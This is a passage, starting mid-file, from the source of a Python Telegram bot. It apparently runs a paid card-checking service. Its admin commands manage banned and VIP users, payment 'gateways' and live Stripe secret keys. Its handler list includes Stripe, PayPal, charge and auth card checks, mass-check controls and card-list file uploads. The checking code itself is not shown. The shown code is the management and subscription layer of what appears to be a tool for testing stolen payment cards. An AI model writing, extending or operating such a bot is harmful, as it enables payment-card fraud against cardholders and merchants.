async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    BANNED_USERS.pop(int(context.args[0]), None)
    await update.message.reply_text(premium_emoji("✅ Unbanned."), parse_mode="HTML")

async def add_gateway(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    url = context.args[0]
    if url not in GATEWAYS:
        GATEWAYS.append(url)
        await update.message.reply_text(premium_emoji(f"✅ Gateway #{len(GATEWAYS)} added."), parse_mode="HTML")

async def remove_gateway(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    try:
        if context.args:
            idx = int(context.args[0])
            if 1 <= idx <= len(GATEWAYS):
                GATEWAYS.pop(idx - 1)
                await update.message.reply_text(premium_emoji(f"🗑 Gateway #{idx} removed!\n\n📌 Remaining: {len(GATEWAYS)}"), parse_mode="HTML")
            else:
                await update.message.reply_text(premium_emoji(f"❌ Gateway #{idx} not found!"), parse_mode="HTML")
        else:
            if GATEWAYS:
                GATEWAYS.pop()
                await update.message.reply_text(premium_emoji("🗑 Last gateway removed."), parse_mode="HTML")
            else:
                await update.message.reply_text(premium_emoji("❌ No gateways to remove."), parse_mode="HTML")
    except Exception as e:
        await update.message.reply_text(premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")

async def add_prm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    VIP_USERS[int(context.args[0])] = int(time.time()) + (int(context.args[1]) * 86400)
    await update.message.reply_text(premium_emoji("✅ VIP added."), parse_mode="HTML")

async def remove_prm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    VIP_USERS.pop(int(context.args[0]), None)
    await update.message.reply_text(premium_emoji("✅ VIP removed."), parse_mode="HTML")

async def add_stripe_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    args_text = " ".join(context.args)
    pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', args_text)
    sk_match = re.search(r'sk_live_[a-zA-Z0-9]+', args_text)
    if not pk_match or not sk_match:
        await update.message.reply_text(premium_emoji("💡 Usage:\n<code>/addkey pk_live_xxx sk_live_xxx</code>"), parse_mode="HTML")
        return
    pk, sk = pk_match.group(0), sk_match.group(0)
    key_id = str(len(STRIPE_KEYS) + 1)
    STRIPE_KEYS[key_id] = {"pk": pk, "sk": sk}
    with open('stripe_keys.json', 'w') as f:
        json.dump(STRIPE_KEYS, f)
    await update.message.reply_text(premium_emoji(f"✅ Stripe Key Saved!\n🆔 Key ID: <code>{key_id}</code>"), parse_mode="HTML")

async def remove_stripe_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    if not context.args: return
    key_id = context.args[0]
    if key_id in STRIPE_KEYS:
        del STRIPE_KEYS[key_id]
        new_keys = {}
        for i, (old_key, value) in enumerate(STRIPE_KEYS.items(), 1):
            new_keys[str(i)] = value
        STRIPE_KEYS.clear()
        STRIPE_KEYS.update(new_keys)
        with open('stripe_keys.json', 'w') as f:
            json.dump(STRIPE_KEYS, f)
        await update.message.reply_text(premium_emoji(f"✅ Key {key_id} removed!\n\n📌 Remaining: {len(STRIPE_KEYS)}"), parse_mode="HTML")
    else:
        await update.message.reply_text(premium_emoji(f"❌ Key {key_id} not found!"), parse_mode="HTML")

async def try_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    try:
        user_id = int(context.args[0])
        reply_text = " ".join(context.args[1:])
        await context.bot.send_message(chat_id=user_id, text=premium_emoji(reply_text), parse_mode="HTML")
    except: pass

async def sent_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    broadcast_msg = " ".join(context.args)
    for user_id in list(ALL_USERS):
        try:
            await context.bot.send_message(chat_id=user_id, text=premium_emoji(f"📢 {broadcast_msg}"), parse_mode="HTML")
            await asyncio.sleep(0.05)
        except: continue

async def error_handler(update, context):
    pass

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_error_handler(error_handler)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cmds", cmds))
    app.add_handler(CommandHandler("pp", pp))
    app.add_handler(CommandHandler("auth", auth_check))
    app.add_handler(CommandHandler("st", st_check))
    app.add_handler(CommandHandler("ch", ch_check))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("code", code_command))
    app.add_handler(CommandHandler("wafa", wafa_command))
    app.add_handler(CommandHandler("show_users", show_users))
    app.add_handler(CommandHandler("show_gateways", show_gateways))
    app.add_handler(CommandHandler("ban_user", ban_user))
    app.add_handler(CommandHandler("unban_user", unban_user))
    app.add_handler(CommandHandler("try", try_reply))
    app.add_handler(CommandHandler("SENT", sent_broadcast))
    app.add_handler(CommandHandler("add", add_gateway))
    app.add_handler(CommandHandler("rmadd", remove_gateway))
    app.add_handler(CommandHandler("prm", add_prm))
    app.add_handler(CommandHandler("rmprm", remove_prm))
    app.add_handler(CommandHandler("addkey", add_stripe_key))
    app.add_handler(CommandHandler("rmkey", remove_stripe_key))
    app.add_handler(CommandHandler("clean", clean_command))
    app.add_handler(CommandHandler("parts", parts_command))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file_panel))
    app.add_handler(CallbackQueryHandler(free_cmds_callback, pattern="^free_cmds$"))
    app.add_handler(CallbackQueryHandler(vip_cmds_callback, pattern="^vip_cmds$"))
    app.add_handler(CallbackQueryHandler(admin_cmds_callback, pattern="^admin_cmds$"))
    app.add_handler(CallbackQueryHandler(check_panel_callback, pattern="^check_panel$"))
    app.add_handler(CallbackQueryHandler(check_paypal_callback, pattern="^check_paypal$"))
    app.add_handler(CallbackQueryHandler(check_stripe_callback, pattern="^check_stripe$"))
    app.add_handler(CallbackQueryHandler(check_charge_callback, pattern="^check_charge$"))
    app.add_handler(CallbackQueryHandler(check_auth_callback, pattern="^check_auth$"))
    app.add_handler(CallbackQueryHandler(clean_panel_callback, pattern="^clean_panel$"))
    app.add_handler(CallbackQueryHandler(parts_panel_callback, pattern="^parts_panel$"))
    app.add_handler(CallbackQueryHandler(stats_panel_callback, pattern="^stats_panel$"))
    app.add_handler(CallbackQueryHandler(back_to_start_callback, pattern="^back_to_start$"))
    app.add_handler(CallbackQueryHandler(gate_info_callback, pattern="^gate_info_"))
    app.add_handler(CallbackQueryHandler(gate_remove_callback, pattern="^gate_remove_"))
    app.add_handler(CallbackQueryHandler(back_to_gateways_callback, pattern="^back_to_gateways$"))
    app.add_handler(CallbackQueryHandler(close_gateways_callback, pattern="^close_gateways$"))
    app.add_handler(CallbackQueryHandler(gateway_callback, pattern="^gateway_"))
    app.add_handler(CallbackQueryHandler(stop_mass_callback, pattern="^stop_mass_"))
    app.run_polling()

if __name__ == "__main__":
    main()
